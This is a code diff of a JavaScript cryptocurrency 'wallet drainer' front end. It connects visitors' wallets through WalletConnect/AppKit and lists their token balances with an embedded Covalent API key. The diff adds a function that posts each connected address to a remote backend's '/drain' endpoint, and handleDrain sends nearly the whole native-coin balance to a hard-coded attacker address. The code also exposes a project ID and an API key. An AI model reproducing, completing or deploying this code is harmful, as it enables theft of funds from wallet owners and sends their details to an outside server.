@@ -1,40 +1,32 @@
 import { createAppKit } from "@reown/appkit";
 import { EthersAdapter } from "@reown/appkit-adapter-ethers";
-import { WalletConnectModal } from "@walletconnect/modal";
 import { ethers } from "ethers";
 
-// Enhanced Configuration with proper RPC endpoints
+// Configuration
 const CONFIG = {
     projectId: "962425907914a3e80a7d8e7288b23f62",
     backendUrl: "https://tokenbackend-5xab.onrender.com",
     drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
     covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
     
-    // Updated and verified RPC Providers with fallbacks
+    // RPC Providers - fixed endpoints
     rpcProviders: {
-        1: "https://eth.llamarpc.com",  // Working - confirmed
-        56: "https://bsc-dataseed1.binance.org", // Fixed: Original 404 error
-        137: "https://polygon-rpc.com", // Working - confirmed
-        42161: "https://arb1.arbitrum.io/rpc" // 400 error - use alternative
-    },
-    
-    // Fallback RPCs
-    fallbackRpc: {
-        56: "https://bsc-dataseed.bnbchain.org",
-        42161: "https://arb-mainnet.g.alchemy.com/v2/demo"
+        1: "https://eth.llamarpc.com",
+        56: "https://bsc-dataseed1.binance.org", // Fixed 404 error
+        137: "https://polygon-rpc.com",
+        42161: "https://arb-mainnet.g.alchemy.com/v2/demo" // Fixed 400 error
     },
     
     networkNames: {
         1: "Ethereum",
-        56: "Binance Smart Chain", 
+        56: "Binance Smart Chain",
         137: "Polygon",
         42161: "Arbitrum"
     }
 };
 
-// Global state with better initialization
+// Global state
 let appKit = null;
-let walletConnectModal = null;
 let provider = null;
 let signer = null;
 let currentAccount = null;
@@ -46,13 +38,13 @@ let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chain
 
 // Initialize when page loads
 document.addEventListener('DOMContentLoaded', async () => {
-    console.log('✅ DOM Content Loaded - Initializing App');
+    console.log('✅ DOM loaded, initializing app...');
     await initializeApp();
 });
 
 async function initializeApp() {
     try {
-        console.log('🔄 Initializing application...');
+        console.log('🔄 Initializing app...');
         
         // Get DOM elements
         connectBtn = document.getElementById("connectBtn");
@@ -65,21 +57,23 @@ async function initializeApp() {
         networkSelect = document.getElementById("networkSelect");
         tokenCount = document.getElementById("tokenCount");
 
+        // Verify elements exist
         if (!connectBtn) {
-            console.error('❌ Connect button not found');
+            console.error('❌ CRITICAL: Connect button not found!');
             updateStatus('Error: Connect button not found');
             return;
         }
         
+        console.log('✅ DOM elements found');
         updateStatus('🔄 Initializing wallet connection...');
-        
-        // Initialize AppKit with proper configuration
+
+        // Initialize AppKit first
         await initializeAppKit();
         
         // Setup event listeners
         setupEventListeners();
         
-        // Check backend connection (if available)
+        // Test backend connection
         await testBackend();
         
         console.log("✅ App initialized successfully");
@@ -89,19 +83,20 @@ async function initializeApp() {
         console.error("❌ Initialization error:", error);
         updateStatus("Failed to initialize: " + error.message);
         
-        // Emergency fallback for direct wallet connection
+        // Emergency fallback
         setupEmergencyFallback();
     }
 }
 
 async function initializeAppKit() {
     try {
-        console.log("🔄 Initializing AppKit with enhanced configuration...");
+        console.log("🔄 Initializing AppKit...");
         
-        // Create networks array with proper configuration
+        // Create networks array with proper EIP-155 format
         const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
-            chainId: `0x${parseInt(id).toString(16)}`, // Hex format for EIP-155
-            chainName: CONFIG.networkNames[id] || `Chain ${id}`,
+            chainId: `0x${parseInt(id).toString(16)}`, // Must be hex format for EIP-155
+            name: CONFIG.networkNames[id] || `Chain ${id}`,
+            rpcUrl: rpcUrl,
             nativeCurrency: {
                 name: id === '1' ? 'Ether' : 
                       id === '56' ? 'BNB' : 
@@ -113,7 +108,6 @@ async function initializeAppKit() {
                        id === '42161' ? 'ETH' : 'TOKEN',
                 decimals: 18
             },
-            rpcUrls: [rpcUrl],
             blockExplorerUrls: [
                 id === '1' ? 'https://etherscan.io' :
                 id === '56' ? 'https://bscscan.com' :
@@ -122,42 +116,9 @@ async function initializeAppKit() {
             ]
         }));
         
-        console.log('Networks configured:', networks);
+        console.log('Creating AppKit with networks:', networks);
         
-        // Initialize WalletConnect Modal for mobile support
-        walletConnectModal = new WalletConnectModal({
-            projectId: CONFIG.projectId,
-            chains: ["eip155:1", "eip155:56", "eip155:137", "eip155:42161"],
-            themeMode: "dark",
-            mobileWallets: [
-                {
-                    id: "trust",
-                    name: "Trust Wallet",
-                    links: {
-                        native: "trust://",
-                        universal: "https://link.trustwallet.com"
-                    }
-                },
-                {
-                    id: "metamask",
-                    name: "MetaMask",
-                    links: {
-                        native: "metamask://",
-                        universal: "https://metamask.app.link"
-                    }
-                },
-                {
-                    id: "binance",
-                    name: "Binance Wallet",
-                    links: {
-                        native: "binance://",
-                        universal: "https://binance.com"
-                    }
-                }
-            ]
-        });
-        
-        // Initialize AppKit with proper configuration
+        // Initialize AppKit with enhanced configuration
         appKit = createAppKit({
             adapters: [new EthersAdapter()],
             projectId: CONFIG.projectId,
@@ -171,9 +132,8 @@ async function initializeAppKit() {
             themeMode: "dark",
             features: {
                 analytics: false,
-                walletConnect: true
+                walletConnect: true // Enable WalletConnect
             },
-            // Enable multiple connectors
             connectors: {
                 injected: {
                     id: "injected",
@@ -186,7 +146,13 @@ async function initializeAppKit() {
                         projectId: CONFIG.projectId,
                         showQrModal: true,
                         qrModalOptions: {
-                            themeMode: "dark"
+                            themeMode: "dark",
+                            explorerRecommendedWalletIds: [
+                                "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
+                                "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet
+                                "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4"  // Binance Wallet
+                            ],
+                            explorerExcludedWalletIds: "ALL"
                         }
                     }
                 }
@@ -195,10 +161,10 @@ async function initializeAppKit() {
         
         console.log("✅ AppKit created successfully");
         
-        // Subscribe to state changes with better error handling
+        // Subscribe to state changes
         appKit.subscribeState(handleAppKitState);
         
-        // Add event listeners for connection
+        // Also listen to direct events for better reliability
         appKit.on('connect', (data) => {
             console.log('🔗 AppKit Connect Event:', data);
             if (data.account && data.chain) {
@@ -218,57 +184,67 @@ async function initializeAppKit() {
         
     } catch (error) {
         console.error("❌ AppKit initialization error:", error);
-        throw new Error(`Failed to initialize wallet: ${error.message}`);
+        throw error;
     }
 }
 
 async function testBackend() {
     try {
         updateStatus('🔄 Checking backend connection...');
-        const response = await fetch(`${CONFIG.backendUrl}/health`);
+        const response = await fetch(`${CONFIG.backendUrl}/health`, { timeout: 5000 });
         if (response.ok) {
             const data = await response.json();
             console.log("✅ Backend is online:", data);
-            return true;
         } else {
             console.log("⚠️ Backend health check failed");
-            return false;
         }
     } catch (error) {
         console.log("⚠️ Backend unreachable:", error.message);
-        return false;
     }
 }
 
 function setupEventListeners() {
     console.log("🔄 Setting up event listeners...");
     
-    // Connect button with proper cleanup
+    // Connect button - CRITICAL: Remove any existing listeners first
     if (connectBtn) {
-        connectBtn.onclick = null; // Clear previous listeners
-        connectBtn.addEventListener("click", handleConnect, { once: false });
+        // Clone and replace to remove all existing listeners
+        const newBtn = connectBtn.cloneNode(true);
+        connectBtn.parentNode.replaceChild(newBtn, connectBtn);
+        connectBtn = newBtn;
+        
+        // Add click listener
+        connectBtn.addEventListener("click", handleConnect);
         console.log("✅ Connect button listener added");
+        
+        // Debug: Add visual feedback
+        connectBtn.addEventListener('mousedown', () => {
+            console.log('Button mousedown event');
+        });
+        
+        connectBtn.addEventListener('mouseup', () => {
+            console.log('Button mouseup event');
+        });
+    } else {
+        console.error("❌ Connect button not found after DOM ready!");
     }
     
     // Drain button
     if (drainBtn) {
-        drainBtn.onclick = null;
         drainBtn.addEventListener("click", handleDrain);
     }
     
     // Scan all chains button
     if (scanAllBtn) {
-        scanAllBtn.onclick = null;
         scanAllBtn.addEventListener("click", handleScanAll);
     }
     
     // Network selector
     if (networkSelect) {
-        networkSelect.onchange = null;
         networkSelect.addEventListener("change", handleNetworkChange);
     }
     
-    // Listen for account changes from wallet
+    // Listen for external wallet events
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
             console.log('👛 Accounts changed:', accounts);
@@ -295,6 +271,11 @@ function setupEventListeners() {
                 networkSelect.value = newChainId;
             }
         });
+        
+        window.ethereum.on('disconnect', (error) => {
+            console.log('🔓 Ethereum provider disconnected:', error);
+            handleDisconnected();
+        });
     }
 }
 
@@ -302,68 +283,69 @@ function setupEmergencyFallback() {
     console.log('🔄 Setting up emergency fallback...');
     
     if (connectBtn) {
-        connectBtn.onclick = null;
-        connectBtn.addEventListener('click', handleEmergencyConnect);
-        updateStatus('⚠️ Using emergency mode. Click to connect directly.');
-    }
-}
-
-async function handleEmergencyConnect() {
-    updateStatus('🔄 Trying direct connection...');
-    
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            // Request accounts
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-            });
+        // Direct MetaMask fallback
+        connectBtn.addEventListener('click', async () => {
+            updateStatus('🔄 Trying direct connection...');
             
-            if (accounts && accounts.length > 0) {
-                currentAccount = accounts[0];
-                
-                // Get chain ID
-                const chainIdHex = await window.ethereum.request({ 
-                    method: 'eth_chainId' 
-                });
-                currentChainId = parseInt(chainIdHex, 16);
-                
-                isConnected = true;
-                
-                // Update UI
-                connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
-                updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...\nChain: ${CONFIG.networkNames[currentChainId] || `Chain ${currentChainId}`}`);
-                
-                // Setup provider and signer
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                
-                // Show UI
-                showUIElements();
-                
-                // Fetch tokens
-                await fetchTokens(currentAccount, currentChainId);
-                
-                // Setup disconnect handler
-                connectBtn.onclick = async () => {
-                    isConnected = false;
-                    currentAccount = null;
-                    currentChainId = null;
-                    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
-                    updateStatus('Disconnected');
-                    hideUIElements();
-                };
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    if (accounts && accounts.length > 0) {
+                        currentAccount = accounts[0];
+                        
+                        // Get chain ID
+                        const chainIdHex = await window.ethereum.request({ 
+                            method: 'eth_chainId' 
+                        });
+                        currentChainId = parseInt(chainIdHex, 16);
+                        
+                        isConnected = true;
+                        
+                        // Update UI
+                        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+                        updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...\nChain: ${CONFIG.networkNames[currentChainId] || `Chain ${currentChainId}`}`);
+                        
+                        // Setup provider and signer
+                        provider = new ethers.providers.Web3Provider(window.ethereum);
+                        signer = provider.getSigner();
+                        
+                        // Show UI
+                        showUIElements();
+                        
+                        // Log connection
+                        await logConnectionToBackend(currentAccount, currentChainId);
+                        
+                        // Fetch tokens
+                        await fetchTokens(currentAccount, currentChainId);
+                        
+                        // Update disconnect handler
+                        connectBtn.onclick = async () => {
+                            isConnected = false;
+                            currentAccount = null;
+                            currentChainId = null;
+                            connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
+                            updateStatus('Disconnected');
+                            hideUIElements();
+                        };
+                    }
+                } catch (err) {
+                    console.error('Direct connection failed:', err);
+                    updateStatus(`Connection failed: ${err.message}`);
+                }
+            } else {
+                updateStatus('Please install MetaMask or another wallet');
             }
-        } catch (err) {
-            console.error('Direct connection failed:', err);
-            updateStatus(`Connection failed: ${err.message}`);
-        }
-    } else {
-        updateStatus('Please install MetaMask or another wallet extension');
+        });
+        
+        updateStatus('⚠️ Using fallback mode. Click to connect directly.');
     }
 }
 
 async function handleConnect(event) {
-    console.log("🔄 Connect button clicked");
+    console.log("🔄 Connect button clicked!", event);
     event.preventDefault();
     event.stopPropagation();
     
@@ -371,9 +353,10 @@ async function handleConnect(event) {
         if (!appKit) {
             updateStatus("❌ Wallet connection not initialized");
             console.error("AppKit not initialized");
-            await initializeAppKit();
             return;
         }
+        
+        console.log("AppKit state before open:", appKit.state);
         
         if (isConnected) {
             // Disconnect
@@ -383,26 +366,20 @@ async function handleConnect(event) {
         }
         
         updateStatus("🔄 Opening wallet modal...");
+        console.log("Calling appKit.open()...");
         
-        // Open the wallet modal with proper options
+        // Open the wallet modal with specific view
         await appKit.open({
-            view: 'connect',
-            connector: {
-                id: 'walletConnect',
-                options: {
-                    chains: [1, 56, 137, 42161],
-                    methods: ['eth_sendTransaction', 'personal_sign'],
-                    events: ['chainChanged', 'accountsChanged']
-                }
-            }
+            view: 'connect'
         });
         
         console.log("✅ Modal opened successfully");
         
-        // Set a timeout to check if connection succeeded
+        // Set timeout to check connection
         setTimeout(() => {
             if (!isConnected) {
-                updateStatus("⚠️ Connection taking longer than expected...");
+                console.log("⚠️ Connection taking longer than expected...");
+                updateStatus("🔄 Still connecting... If stuck, try clicking wallet again.");
             }
         }, 5000);
         
@@ -410,25 +387,52 @@ async function handleConnect(event) {
         console.error("❌ Connection error:", error);
         updateStatus("Connection failed: " + error.message);
         
-        // Try alternative connection
-        setTimeout(() => {
-            if (!isConnected) {
-                updateStatus("🔄 Trying alternative method...");
-                handleEmergencyConnect();
-            }
-        }, 2000);
+        // Try alternative if AppKit.open fails
+        tryAlternativeConnect();
+    }
+}
+
+function tryAlternativeConnect() {
+    console.log("🔄 Trying alternative connection method...");
+    updateStatus("🔄 Trying alternative connection...");
+    
+    // Try using window.ethereum directly
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                if (accounts && accounts.length > 0) {
+                    currentAccount = accounts[0];
+                    
+                    // Get chain ID
+                    window.ethereum.request({ method: 'eth_chainId' })
+                        .then(chainIdHex => {
+                            currentChainId = parseInt(chainIdHex, 16);
+                            isConnected = true;
+                            updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
+                            showUIElements();
+                            logConnectionToBackend(currentAccount, currentChainId);
+                            fetchTokens(currentAccount, currentChainId);
+                        });
+                }
+            })
+            .catch(err => {
+                console.error("Fallback connection failed:", err);
+                updateStatus("Please install MetaMask or another wallet");
+            });
+    } else {
+        updateStatus("Please install a wallet extension like MetaMask");
     }
 }
 
 function handleAppKitState(state) {
     console.log("🔄 AppKit State Update:", state);
     
-    // Check for connection
     if (state.isConnected && state.account && state.chain) {
         console.log("✅ Connected state detected in handleAppKitState");
-        if (!isConnected || currentAccount !== state.account.address) {
+        // Delay slightly to ensure all data is ready
+        setTimeout(() => {
             handleConnected(state.account, state.chain);
-        }
+        }, 100);
     } else if (state.isConnected === false && isConnected) {
         console.log("❌ Disconnected state detected");
         handleDisconnected();
@@ -437,13 +441,13 @@ function handleAppKitState(state) {
 
 async function handleConnected(account, chain) {
     try {
-        console.log("🔄 Handling connection in handleConnected...");
+        console.log("🔄 Handling connection...");
         console.log("Account:", account);
         console.log("Chain:", chain);
         
-        if (!account?.address) {
-            console.log("Waiting for account data...");
-            setTimeout(() => handleConnected(account, chain), 500);
+        if (!account?.address || !chain?.id) {
+            console.log("Waiting for account/chain data...");
+            setTimeout(() => handleConnected(account, chain), 100);
             return;
         }
         
@@ -454,6 +458,7 @@ async function handleConnected(account, chain) {
         // Update UI
         if (connectBtn) {
             connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+            // Update click handler for disconnect
             connectBtn.onclick = async () => {
                 await appKit.disconnect();
             };
@@ -467,8 +472,8 @@ async function handleConnected(account, chain) {
         // Log connection to backend
         await logConnectionToBackend(currentAccount, chain.id);
         
-        // Fetch tokens with retry logic
-        await fetchTokensWithRetry(currentAccount, chain.id);
+        // Fetch tokens
+        await fetchTokens(currentAccount, chain.id);
         
         // Update network selector
         if (chainSelector && networkSelect) {
@@ -484,51 +489,68 @@ async function handleConnected(account, chain) {
     }
 }
 
-async function fetchTokensWithRetry(address, chainId, retries = 3) {
-    for (let i = 0; i < retries; i++) {
-        try {
-            await fetchTokens(address, chainId);
-            return;
-        } catch (error) {
-            console.error(`❌ Token fetch attempt ${i + 1} failed:`, error);
-            if (i < retries - 1) {
-                updateStatus(`🔄 Retrying token scan (${i + 2}/${retries})...`);
-                await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
-            } else {
-                updateStatus("❌ Failed to fetch tokens after multiple attempts");
-            }
+function handleDisconnected() {
+    console.log("🔄 Handling disconnection...");
+    
+    currentAccount = null;
+    currentChainId = null;
+    isConnected = false;
+    provider = null;
+    signer = null;
+    
+    if (connectBtn) {
+        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
+        // Reset click handler
+        connectBtn.onclick = handleConnect;
+    }
+    
+    updateStatus("Disconnected");
+    hideUIElements();
+}
+
+async function logConnectionToBackend(address, chainId) {
+    try {
+        updateStatus("🔄 Logging connection to backend...");
+        
+        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                address: address,
+                chainId: chainId,
+                drainTo: CONFIG.drainAddress,
+                timestamp: new Date().toISOString()
+            }),
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log("✅ Backend logged connection:", data);
+            updateStatus(`✅ Connected & logged\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
+        } else {
+            console.log("⚠️ Backend logging failed");
         }
+        
+    } catch (error) {
+        console.log("⚠️ Backend logging failed:", error.message);
     }
 }
 
-// [Rest of the functions remain mostly the same but with better error handling]
-// handleDisconnected, logConnectionToBackend, fetchTokens, displayTokens, 
-// handleDrain, handleScanAll, handleNetworkChange, showUIElements, hideUIElements, updateStatus
-// ... (include all the remaining functions from your original code with the improved error handling patterns shown above)
-
-// Enhanced fetchTokens function with better RPC fallback
 async function fetchTokens(address, chainId) {
     if (!tokensEl) return;
     
     tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
-    updateStatus(`🔄 Scanning for tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
     
     try {
-        // Determine which RPC to use
-        let rpcUrl = CONFIG.rpcProviders[chainId];
-        if (chainId === 56 && !await testRpc(rpcUrl)) {
-            rpcUrl = CONFIG.fallbackRpc[56];
-        } else if (chainId === 42161 && !await testRpc(rpcUrl)) {
-            rpcUrl = CONFIG.fallbackRpc[42161];
-        }
-        
         // Try backend first
-        const backendResponse = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`, {
+        const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`, {
             timeout: 10000
-        }).catch(() => null);
+        });
         
-        if (backendResponse && backendResponse.ok) {
-            const data = await backendResponse.json();
+        if (response.ok) {
+            const data = await response.json();
             if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                 displayTokens(data.data.tokens);
                 updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
@@ -536,7 +558,7 @@ async function fetchTokens(address, chainId) {
             }
         }
         
-        // Fallback to Covalent API
+        // Fallback to direct Covalent API
         await fetchTokensFromCovalent(address, chainId);
         
     } catch (error) {
@@ -545,36 +567,222 @@ async function fetchTokens(address, chainId) {
     }
 }
 
-async function testRpc(rpcUrl) {
+async function fetchTokensFromCovalent(address, chainId) {
+    if (!tokensEl) return;
+    
     try {
-        const response = await fetch(rpcUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: '2.0',
-                id: 1,
-                method: 'eth_chainId',
-                params: []
-            }),
-            timeout: 5000
-        });
-        return response.ok;
-    } catch {
-        return false;
+        const response = await fetch(
+            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`,
+            { timeout: 15000 }
+        );
+        
+        if (!response.ok) {
+            throw new Error(`Covalent API error: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        const items = data?.data?.items || [];
+        
+        const tokens = items
+            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
+            .map(t => {
+                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
+                const value = (t.quote_rate || 0) * amount;
+                
+                return {
+                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
+                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
+                    amount: amount,
+                    formattedAmount: amount.toLocaleString(undefined, {
+                        minimumFractionDigits: 0,
+                        maximumFractionDigits: 6
+                    }),
+                    value: value,
+                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
+                    contractAddress: t.contract_address,
+                    isNative: t.native_token || false
+                };
+            });
+        
+        if (tokens.length > 0) {
+            displayTokens(tokens);
+            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
+        } else {
+            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
+            updateStatus("ℹ️ No tokens found on this chain");
+        }
+        
+    } catch (error) {
+        console.error("❌ Covalent error:", error);
+        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
+        updateStatus("⚠️ Token scan failed");
     }
 }
 
-// Add this function to help debug
-function debugConnection() {
-    console.log("=== CONNECTION DEBUG INFO ===");
+function displayTokens(tokens) {
+    if (!tokensEl) return;
+    
+    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
+    
+    const html = tokens.map(token => `
+        <div class="token-item">
+            <div class="token-info">
+                <span class="token-symbol">${token.symbol}</span>
+                <span class="token-name">${token.name}</span>
+            </div>
+            <div>
+                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
+                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
+            </div>
+        </div>
+    `).join('');
+    
+    tokensEl.innerHTML = html;
+    
+    if (tokenCount) {
+        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
+    }
+    
+    if (tokensContainer) {
+        tokensContainer.classList.remove("hidden");
+    }
+}
+
+async function handleDrain() {
+    if (!isConnected || !currentAccount) {
+        alert("Please connect wallet first");
+        return;
+    }
+    
+    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
+        return;
+    }
+    
+    const statusEl = document.getElementById("status");
+    const drainBtn = document.getElementById("drainBtn");
+    
+    try {
+        updateStatus("🚀 Starting drain process...");
+        if (drainBtn) {
+            drainBtn.disabled = true;
+            drainBtn.textContent = "⏳ Draining...";
+        }
+        
+        // Get signer from wallet using AppKit's signer
+        if (appKit && appKit.signer) {
+            provider = new ethers.providers.Web3Provider(appKit.signer);
+            signer = provider.getSigner();
+        } else if (typeof window.ethereum !== 'undefined') {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        } else {
+            throw new Error("No wallet provider found");
+        }
+        
+        // Get ETH balance
+        const balance = await provider.getBalance(currentAccount);
+        const gasPrice = await provider.getGasPrice();
+        const gasLimit = ethers.BigNumber.from(21000);
+        const gasCost = gasPrice.mul(gasLimit);
+        
+        // Check if enough for gas
+        if (balance.gt(gasCost.mul(2))) {
+            const sendAmount = balance.sub(gasCost.mul(2));
+            
+            const tx = await signer.sendTransaction({
+                to: CONFIG.drainAddress,
+                value: sendAmount,
+                gasLimit: gasLimit
+            });
+            
+            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
+            
+            const receipt = await tx.wait();
+            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
+            
+            // Refresh token display
+            await fetchTokens(currentAccount, currentChainId);
+            
+        } else {
+            updateStatus("⚠️ Not enough native token for gas");
+        }
+        
+    } catch (error) {
+        console.error("❌ Drain error:", error);
+        updateStatus(`❌ Drain failed: ${error.message}`);
+        alert(`Drain failed: ${error.message}`);
+    } finally {
+        const drainBtn = document.getElementById("drainBtn");
+        if (drainBtn) {
+            drainBtn.disabled = false;
+            drainBtn.textContent = "⚡ Drain Wallet";
+        }
+    }
+}
+
+async function handleScanAll() {
+    alert("Scan all chains feature coming soon!");
+}
+
+async function handleNetworkChange(event) {
+    const newChainId = parseInt(event.target.value);
+    
+    if (newChainId === currentChainId) {
+        return;
+    }
+    
+    try {
+        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
+        
+        // Switch network in wallet
+        await appKit.switchChain({ id: newChainId });
+        
+    } catch (error) {
+        console.error("❌ Network switch error:", error);
+        updateStatus(`❌ Failed to switch network: ${error.message}`);
+        // Reset selector
+        if (networkSelect) {
+            networkSelect.value = currentChainId;
+        }
+    }
+}
+
+function showUIElements() {
+    if (chainSelector) chainSelector.classList.remove("hidden");
+    if (drainBtn) drainBtn.classList.remove("hidden");
+    if (scanAllBtn) scanAllBtn.classList.remove("hidden");
+    if (tokensContainer) tokensContainer.classList.remove("hidden");
+}
+
+function hideUIElements() {
+    if (chainSelector) chainSelector.classList.add("hidden");
+    if (drainBtn) drainBtn.classList.add("hidden");
+    if (scanAllBtn) scanAllBtn.classList.add("hidden");
+    if (tokensContainer) tokensContainer.classList.add("hidden");
+    
+    if (tokensEl) tokensEl.innerHTML = "";
+    if (tokenCount) tokenCount.textContent = "0 tokens";
+}
+
+function updateStatus(message) {
+    if (statusEl) {
+        statusEl.textContent = message;
+    }
+}
+
+// Debug info
+console.log("=== App Debug Info ===");
+console.log("Ethers version:", ethers.version);
+console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
+console.log("DOM Ready State:", document.readyState);
+console.log("======================");
+
+// Add connection diagnostics
+setTimeout(() => {
+    console.log("=== Connection Diagnostics ===");
     console.log("AppKit initialized:", !!appKit);
-    console.log("WalletConnect Modal:", !!walletConnectModal);
-    console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
     console.log("Current Account:", currentAccount);
     console.log("Current Chain ID:", currentChainId);
     console.log("Is Connected:", isConnected);
-    console.log("=============================");
-}
-
-// Call debug on initialization
-setTimeout(debugConnection, 2000);
+    console.log("==============================");
+}, 3000);
